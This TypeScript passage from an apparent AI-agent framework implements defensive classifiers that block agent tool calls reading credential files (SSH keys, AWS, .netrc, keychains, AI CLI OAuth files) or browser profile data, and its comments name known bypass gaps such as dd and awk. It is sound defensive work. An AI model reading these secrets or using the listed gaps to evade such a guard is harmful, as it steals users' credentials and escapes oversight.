    // Browser-history profile exfiltration (§11.4). The prefix glob
    // layer catches the canonical `cp ~/Library/...` / `cp ~/.config/...`
    // forms; this substring scan catches encoded / shell-expanded
    // variants the prefix matcher cannot express:
    //   - $HOME-expanded paths           ($HOME/Library/Application Support/Google/Chrome/...)
    //   - backtick-substituted paths     (`echo ~/Library/...`)
    //   - $(echo ...)-substituted paths  ($(echo ~/Library/...))
    //   - filename keywords that only appear inside a real profile
    //     directory (`Login Data`, `Cookies`, `Web Data`).
    // The match is case-insensitive over the quote-stripped command
    // line. False-positive surface is narrow — no Aitne skill needs to
    // read these literal substrings; the `browser-history` skill
    // exclusively talks to `localhost:8321`.
    if (looksLikeBrowserProfileBash(scan)) {
      return { category: "browser_profile", redacted: firstToken(arg) };
    }
    return null;
  }

  if (toolName === "Read") {
    if (looksLikeSecretPath(arg)) {
      return { category: "secret_read", redacted: redactPath(arg) };
    }
    if (looksLikeBrowserProfilePath(arg)) {
      return { category: "browser_profile", redacted: redactPath(arg) };
    }
    return null;
  }

  if (toolName === "Write" || toolName === "Edit") {
    if (looksLikeSecretPath(arg)) {
      return { category: "secret_write", redacted: redactPath(arg) };
    }
    if (looksLikeBrowserProfilePath(arg)) {
      return { category: "browser_profile", redacted: redactPath(arg) };
    }
    return null;
  }

  return null;
}

/**
 * Substring scan for shell commands that read a known secret-file
 * path via a file-reader command. Mirrors `looksLikeBashSecretRead`'s
 * sibling pattern for browser-profile paths — runs on the
 * single-quote/heredoc-stripped command and matches case-insensitively
 * to close the same macOS/Windows FS bypass that `looksLikeSecretPath`
 * closes for Read/Write/Edit args.
 *
 * Detection shape: the command's first executable token is in
 * `SECRET_READ_BASH_COMMANDS` (`cat` / `less` / `head` / `xxd` / …) AND
 * the rest of the command contains a recognised secret-file fragment
 * (`.ssh/`, `~/.aws/`, `.env`-extension, `/library/keychains/`, …).
 * Skipping the command anchor would over-block on innocent prose like
 * `echo "see ~/.ssh/config for details"`; pinning the reader keeps the
 * false-positive surface to commands that actually exfiltrate the file.
 *
 * NOT a substitute for the Read-tool glob list — that layer remains
 * the authoritative block for the Read tool. This helper closes the
 * Bash-side hole the glob list cannot express.
 */
export function looksLikeBashSecretRead(cmd: string): boolean {
  const lc = cmd.toLowerCase();
  const first = firstToken(lc);
  // The "executable" we care about is the first token, optionally
  // stripped of a leading path (`/usr/bin/cat` → `cat`). The reader
  // set is intentionally narrow — any reader not in the list is an
  // accepted gap (documented alongside `SECRET_READ_BASH_COMMANDS`).
  const exec = first.includes("/") ? first.slice(first.lastIndexOf("/") + 1) : first;
  const isReader = (SECRET_READ_BASH_COMMANDS as readonly string[]).includes(exec);
  if (!isReader) return false;
  // Path fragments that uniquely identify a secret file / directory.
  // Each fragment is a substring lookup (case-insensitive via the
  // pre-lowercased `lc`). Mirrors the regex table in
  // `looksLikeSecretPath` — kept as plain substrings here because we
  // are scanning an entire command line, not a single path arg.
  const fragments = [
    "/.ssh/",
    "/.ssh ",
    "/.gnupg/",
    "/.gnupg ",
    "/.aws/",
    "/.aws ",
    "/.config/gcloud/",
    "/.config/gh/hosts.yml",
    "/.netrc",
    "/library/keychains/",
    "/.local/share/keyrings/",
    "/.personal-agent/backups/",
    "/.personal-agent/whatsapp/auth/",
    "/.personal-agent/secrets/",
    // Backend CLI OAuth credential files (Claude / Codex / Gemini).
    "/.claude/.credentials.json",
    "/.claude.json",
    "/.codex/auth.json",
    "/.gemini/gemini-credentials.json",
    "/.gemini/oauth_creds.json",
    "/.config/anthropic/",
  ];
  if (fragments.some((f) => lc.includes(f))) return true;
  // `.env` / `.env.*` — the `looksLikeSecretPath` regex requires `$`
  // anchor; in a Bash command, the path is followed by a space, pipe,
  // redirect, or end-of-string. Match each of those bounds explicitly.
  if (/(?:^|[\s/"'])\.env(?:\.[a-z0-9_-]+)?(?=$|[\s|;&<>"'`])/i.test(cmd)) {
    return true;
  }
  // SSH private keys by basename — caught by a path-segment regex so
  // `id_rsa_backup` style suffixes that the path classifier
  // intentionally skips still surface here (the Bash reader context
  // is unambiguous — `cat id_rsa_backup` is not benign).
  if (/(?:^|[\s/"'])id_(?:rsa|ed25519|ecdsa|dsa)(?:[\b._-][^\s|;&<>"'`]*)?(?=$|[\s|;&<>"'`])/i.test(cmd)) {
    return true;
  }
  return false;
}

/**
 * Substring scan for shell commands that touch a browser profile
 * directory. Independent of the prefix-glob matcher — runs on the
 * stripped command line (single-quoted contents + heredocs already
 * collapsed by `stripBashStringContent`) and matches case-insensitively.
 *
 * Exported so the per-backend tool hook (Claude PreToolUse, Gemini
 * admin policy translator) can mirror the same coverage. The substring
 * set is closed: it lists the parent directories every supported
 * browser writes its profile under, plus the profile-specific
 * filenames Chromium uses for high-value tokens.
 */
export function looksLikeBrowserProfileBash(cmd: string): boolean {
  const lc = cmd.toLowerCase();
  // Browser profile *parent* directories — any of these as a substring
  // means the agent is reaching into a profile root. eTLD+1-like
  // matching: the fragment is the OS-specific path prefix the browser
  // owns; nothing legitimate inside Aitne's surface needs to touch
  // these directories.
  const parents = [
    // macOS Application Support roots
    "library/application support/google/chrome",
    "library/application support/chromium",
    "library/application support/microsoft edge",
    "library/application support/bravesoftware",
    "library/application support/comet",
    "library/application support/perplexity comet",
    "library/application support/com.openai.atlas",
    // Linux / XDG roots
    ".config/google-chrome",
    ".config/chromium",
    ".config/microsoft-edge",
    ".config/bravesoftware",
    ".config/comet",
    ".var/app/com.google.chrome",
    // Windows / WSL
    "appdata/local/google/chrome",
    "appdata/local/chromium",
    "appdata/local/microsoft/edge",
    "appdata/local/bravesoftware",
    // Comet on Windows lands under either %LOCALAPPDATA%\Comet\ or
    // %LOCALAPPDATA%\Perplexity\Comet\ depending on build (see platform.ts).
    "appdata/local/comet",
    "appdata/local/perplexity/comet",
    "/mnt/c/users/",
    // MANAGED_CHROMIUM_IMPLEMENTATION_PLAN.md §7.11 — the daemon-owned
    // Chromium profile directories. The path lives under PA_DATA_DIR
    // which is typically `~/.personal-agent/`, but operators may set
    // it elsewhere via env var, so we match the trailing component
    // (which is stable across installs).
    "chromium-sync",
    "chromium-automation",
    "chromium-automation-anon",
    "chromium-automation-auth",
    "chromium-automation-purchase",
  ];
  if (parents.some((p) => lc.includes(p))) return true;
  // Chromium profile-internal filename anchors. Each is matched as a
  // path segment ending the path (or followed by a delimiter
  // character) so legitimate names like `cookies-policy.md` or
  // `/api/web-data` do not false-positive. The `\b` style negative
  // lookahead — `(?=$|[\s"'`)/])` — captures end-of-string, quote
  // closers, and shell metacharacters that bound a token.
  const filenameAnchors: RegExp[] = [
    /\/login data(?=$|[\s"'`)>;|&])/,
    /\/web data(?=$|[\s"'`)>;|&])/,
    /\/cookies(?=$|[\s"'`)>;|&])/,
  ];
  return filenameAnchors.some((r) => r.test(lc));
}

/**
 * Path-shape sibling of `looksLikeBrowserProfileBash` for the
 * `Read(...)` / `Write(...)` / `Edit(...)` tool arg. The prefix-glob
 * layer covers canonical paths; this catches Windows-style paths and
 * encoded forms that the glob matcher's POSIX-only patterns miss.
 */
export function looksLikeBrowserProfilePath(raw: string): boolean {
  const p = raw.replace(/^["']|["']$/g, "").toLowerCase();
  const patterns: RegExp[] = [
    /library\/application support\/google\/chrome/,
    /library\/application support\/chromium/,
    /library\/application support\/microsoft edge/,
    /library\/application support\/bravesoftware/,
    /library\/application support\/comet/,
    /library\/application support\/perplexity comet/,
    /library\/application support\/com\.openai\.atlas/,
    /\.config\/google-chrome/,
    /\.config\/chromium/,
    /\.config\/microsoft-edge/,
    /\.config\/bravesoftware/,
    /\.config\/comet/,
    /\.var\/app\/com\.google\.chrome/,
    /appdata[\\/]local[\\/](google[\\/]chrome|chromium|microsoft[\\/]edge|bravesoftware|comet|perplexity[\\/]comet)/,
    /\/mnt\/c\/users\//,
    // MANAGED_CHROMIUM_IMPLEMENTATION_PLAN.md §7.11 — daemon-owned
    // Chromium profile dirs under PA_DATA_DIR. The trailing-component
    // shape catches paths regardless of where PA_DATA_DIR resolves
    // (default `~/.personal-agent/`, but operators can override).
    /(?:^|[\\/])chromium-sync(?:[\\/]|$)/,
    /(?:^|[\\/])chromium-automation(?:[\\/]|$|-)/,
  ];
  return patterns.some((r) => r.test(p));
}

/**
 * Convenience wrapper used by per-backend tool hooks. Identical
 * coverage to `looksLikeBrowserProfileBash` + `looksLikeBrowserProfilePath`
 * — re-exposed under the name the implementation plan uses
 * (MANAGED_CHROMIUM_IMPLEMENTATION_PLAN.md §7.11) so PreToolUse hooks
 * can import a single function.
 */
export function classifyChromiumTokenAccess(
  toolName: string,
  rawArg: string | undefined,
): AbsoluteBlockMatch | null {
  if (!rawArg) return null;
  if (toolName === "Bash") {
    const scan = stripBashStringContent(rawArg.trim());
    if (looksLikeBrowserProfileBash(scan)) {
      return { category: "browser_profile", redacted: firstToken(rawArg.trim()) };
    }
    return null;
  }
  if (toolName === "Read" || toolName === "Write" || toolName === "Edit") {
    if (looksLikeBrowserProfilePath(rawArg)) {
      return { category: "browser_profile", redacted: redactPath(rawArg) };
    }
  }
  return null;
}

function firstToken(cmd: string): string {
  const m = cmd.match(/^\s*([^\s;&|]+)/);
  /* c8 ignore start — regex always matches a possibly-empty string; the
     null branch is defensive against a future regex tweak. */
  return m ? m[1] : "";
  /* c8 ignore stop */
}

/**
 * Return true when `raw` looks like a path to a credential / secret file.
 *
 * Exported so the observation summarizer's pre-filter (and any other
 * read-side denylist enforcement) can mirror this layer without
 * duplicating the pattern table — see
 * `docs/design/appendices/cost-reduction-structural.md` §A "Privacy".
 *
 * Patterns match **case-insensitively** to close a bypass on case-
 * insensitive filesystems (macOS default, Windows): an agent that submits
 * `Read("~/.SSH/id_rsa")` resolves to the real `~/.ssh/id_rsa` on disk
 * and would otherwise sidestep the absolute-block audit because the
 * SDK's minimatch glob (`Read(~/.ssh/**)`) is case-sensitive. Mirrors
 * the `.toLowerCase()`-on-input strategy already used by
 * `looksLikeBrowserProfilePath`.
 */
export function looksLikeSecretPath(raw: string): boolean {
  // Trim obvious quoting. We deliberately don't resolve `~` / relative
  // paths — the classifier runs against the string the agent passed.
  const p = raw.replace(/^["']|["']$/g, "");
  const patterns: RegExp[] = [
    /(^|\/)\.env(\..+)?$/i,
    /(^|\/)id_(rsa|ed25519|ecdsa|dsa)(\b|\.)/i,
    /\.ssh(\/|$)/i,
    /\.gnupg(\/|$)/i,
    /\.aws(\/|$)/i,
    /\.config\/gcloud(\/|$)/i,
    /\.config\/gh\/hosts\.yml$/i,
    /\.netrc$/i,
    /Library\/Keychains(\/|$)/i,
    /\.local\/share\/keyrings(\/|$)/i,
    /\.personal-agent\/(backups|whatsapp\/auth|secrets)(\/|$)/i,
    // Backend CLI OAuth credential files (Claude / Codex / Gemini) +
    // the Anthropic config dir.
    /(^|\/)\.claude\.json$/i,
    /\.claude\/\.credentials\.json$/i,
    /\.codex\/auth\.json$/i,
    /\.gemini\/(gemini-credentials|oauth_creds)\.json$/i,
    /\.config\/anthropic(\/|$)/i,
  ];
  return patterns.some((r) => r.test(p));
}

function redactPath(raw: string): string {
  // Keep last path segment for operator context, strip the rest.
  const p = raw.replace(/^["']|["']$/g, "");
  const segs = p.split("/");
  /* c8 ignore start — String.split always returns a non-empty array, so
     `segs[segs.length - 1]` is always defined; the `?? ""` fallback is
     defensive only. */
  const tail = segs[segs.length - 1] ?? "";
  return tail.length > 0 ? `.../${tail}` : "<unknown>";
  /* c8 ignore stop */
}

/**
 * Common file-reader commands an agent might use to exfiltrate a secret
 * file via Bash. Each one becomes a `bash` pattern-map deny prefixed
 * with the file path glob from the corresponding `Read(<glob>)` entry —
 * defense in depth on top of the `tools: { read: false }` hard-disable
 * the per-session permission translator emits.
 *
 * Kept narrow: the absolute-block layer is meant to catch canonical
 * exfiltration idioms, not every theoretical shell trick. A motivated
 * attacker can bypass with `dd if=…`, `awk '{print}' …`, or by piping
 * through an unusual interpreter — those gaps are documented in
 * `docs/design/09-safety-cost.md` §6 alongside the Codex allow-mode gap.
 */
const SECRET_READ_BASH_COMMANDS = [
  "cat",
  "less",
  "more",
  "head",
  "tail",
  "strings",
  "xxd",
  "od",
  "hexdump",
] as const;

/**
 * docs/design/appendices/opencode-backend.md §5.8 — render `ALWAYS_DISALLOWED_TOOLS`
 * into an OpenCode-flavoured `permission` block.
 *
 * Translation rules (V5-corrected):
 *   - `Bash(<glob>)` → `permission.bash[<glob>] = "deny"`.
 *   - `Read(<glob>)` → synthesise `permission.bash[<reader> <glob>] = "deny"`
 *     for each entry in `SECRET_READ_BASH_COMMANDS`. The `read` permission
 *     key does not exist in opencode 1.14.50 (V5); per-session sessions
 *     that should have zero read capability set `tools: { read: false }`
 *     instead — the per-session translator handles that branch.
 *   - `Edit(<glob>)` / `Write(<glob>)` → **skipped**. opencode's `edit`
 *     permission is whole-tool (V5), so emitting `edit: "deny"` would
 *     lock every edit, including the agent's legitimate workdir writes.
 *     Coverage falls through to bash-glob denies for canonical write
 *     idioms (`tee`, `cp`, `mv`, `echo > …`) — but those are an
 *     **accepted gap** in opencode's absolute-block layer, mirroring
 *     Codex's allow-mode gap (docs/design/09-safety-cost.md §6).
 *   - Bare tool names like `CronCreate` / `RemoteTrigger` — these are
 *     Claude-SDK-specific server-side tools that don't exist on
 *     OpenCode's surface. Silently skipped (not warned) so future SDK
 *     additions don't pollute opencode's startup logs.
 *
 * Always merged into the per-session permission JSON at the config-
 * builder layer; absolute-block entries take precedence over user-
 * configured allow/deny (deny order is `request_overrides ⊕ absolute_block`,
 * with absolute winning).
 */
export function buildOpencodeAbsoluteBlockPermission(): {
  permission: {
    bash: Record<string, "deny">;
  };
  warnings: string[];
} {
  const bash: Record<string, "deny"> = {};
  for (const entry of ALWAYS_DISALLOWED_TOOLS) {
    if (entry.startsWith("Bash(") && entry.endsWith(")")) {
      const pattern = entry.slice("Bash(".length, -1);
      if (pattern.length > 0) bash[pattern] = "deny";
      continue;
    }
    if (entry.startsWith("Read(") && entry.endsWith(")")) {
      const pathGlob = entry.slice("Read(".length, -1);
      // ALWAYS_DISALLOWED_TOOLS never contains `Read()` (empty glob); guard
      // is defensive in case a future entry is malformed.
      /* c8 ignore next */
      if (pathGlob.length === 0) continue;
      for (const reader of SECRET_READ_BASH_COMMANDS) {
        bash[`${reader} ${pathGlob}`] = "deny";
      }
      continue;
    }
    // Edit(…), Write(…), bare tool names — see function docstring.
  }
  return {
    permission: { bash },
    warnings: [],
  };
}
